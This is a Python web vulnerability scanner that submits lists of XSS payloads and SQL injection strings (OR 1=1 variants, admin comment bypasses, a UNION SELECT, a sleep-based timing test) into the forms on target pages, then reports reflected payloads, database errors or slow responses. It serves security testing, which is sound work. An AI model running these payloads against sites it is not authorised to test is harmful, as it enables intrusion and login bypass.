#!/usr/bin/env python3
import requests, urllib.parse, json, sys, threading, time
from bs4 import BeautifulSoup
from tabulate import tabulate

# -------------------------
# Banner
# -------------------------
BANNER = r"""
 __        __            _      _   _        _   _                 
 \ \      / /__  _ __ __| | ___| | | | ___  | | | | __ _ ___  ___  
  \ \ /\ / / _ \| '__/ _` |/ _ \ |_| |/ _ \ | |_| |/ _` / __|/ _ \ 
   \ V  V / (_) | | | (_| |  __/  _  |  __/ |  _  | (_| \__ \  __/ 
    \_/\_/ \___/|_|  \__,_|\___|_| |_|\___| |_| |_|\__,_|___/\___| 
                                                                    
        Multi-threaded Web Vulnerability Scanner (Upgraded)
                 Build By Dinesh Rimal """
print(BANNER)

# -------------------------
# Colors
# -------------------------
RED='\033[91m'; ORANGE='\033[33m'; YELLOW='\033[93m'; GREEN='\033[92m'; RESET='\033[0m'

# -------------------------
# Globals
# -------------------------
REPORTS = []
THREADS = []
LOCK = threading.Lock()
session = requests.Session()
session.headers.update({'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0 Safari/537.36'})

# -------------------------
# Payloads
# -------------------------
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "'\"><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>"
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    '" OR "1"="1',
    "' OR 'a'='a",
    '" OR "a"="a',
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "admin' --",
    "admin' #",
    "admin'/*",
    "1234' AND 1=0 UNION ALL SELECT 'admin','81dc9bdb52d04dc20036dbd8313ed055'",
    "' OR sleep(5)--",  # time-based
]

SQL_ERRORS = [
    "SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL", "syntax error",
    "Unclosed quotation mark", "Microsoft OLE DB Provider"
]

# -------------------------
# Scanner functions
# -------------------------
def scan_forms(url):
    try:
        r = session.get(url, timeout=10)
        r.raise_for_status()
        soup = BeautifulSoup(r.text, 'html.parser')
        forms = soup.find_all('form')
        print(f"[*] Found {len(forms)} forms on {url}")

        for form in forms:
            action = form.get('action') or url
            method = form.get('method','get').lower()
            inputs = [inp.get('name') for inp in form.find_all('input') if inp.get('name')]
            target_url = urllib.parse.urljoin(url, action)

            # --- XSS scan ---
            for payload in XSS_PAYLOADS:
                data = {name: payload for name in inputs}
                resp = session.post(target_url, data=data) if method=='post' else session.get(target_url, params=data)
                if payload in resp.text:
                    with LOCK:
                        REPORTS.append({'Type':'XSS', 'Target':target_url, 'Payload':payload, 'Severity':'High'})

            # --- SQLi scan ---
            for payload in SQLI_PAYLOADS:
                data = {name: payload for name in inputs}
                start = time.time()
                resp = session.post(target_url, data=data, timeout=15) if method=='post' else session.get(target_url, params=data, timeout=15)
                duration = time.time() - start
                if any(err.lower() in resp.text.lower() for err in SQL_ERRORS) or duration > 4:  # simple time-based detection
                    with LOCK:
                        REPORTS.append({'Type':'SQL Injection', 'Target':target_url, 'Payload':payload, 'Severity':'High'})

    except Exception as e:
        print(f"[!] Error scanning {url}: {e}")

# -------------------------
# Multi-threaded scan
# -------------------------
def scan_urls(urls):
    for url in urls:
        t = threading.Thread(target=scan_forms, args=(url,))
        t.start()
        THREADS.append(t)
    for t in THREADS:
        t.join()

# -------------------------
# Report
# -------------------------
def display_report(json_save=True):
    if not REPORTS:
        print(GREEN+"[*] No vulnerabilities detected."+RESET)
        return
    table=[]
    for r in REPORTS:
        sev_color = RED+'High 🔴'+RESET if r['Severity']=='High' else ORANGE+'Medium 🟠'+RESET
        table.append([r['Type'], r['Target'], r['Payload'], sev_color])
    print(tabulate(table, headers=["Type","Target","Payload","Severity"], tablefmt="fancy_grid"))
    if json_save:
        with open("vuln_report.json","w") as f:
            json.dump(REPORTS,f,indent=2)
        print(f"[*] JSON report saved as vuln_report.json")

# -------------------------
# Main
# -------------------------
if __name__=="__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 scanner.py <url1> [url2 ...]")
        exit(1)
    urls = sys.argv[1:]
    scan_urls(urls)
    display_report()
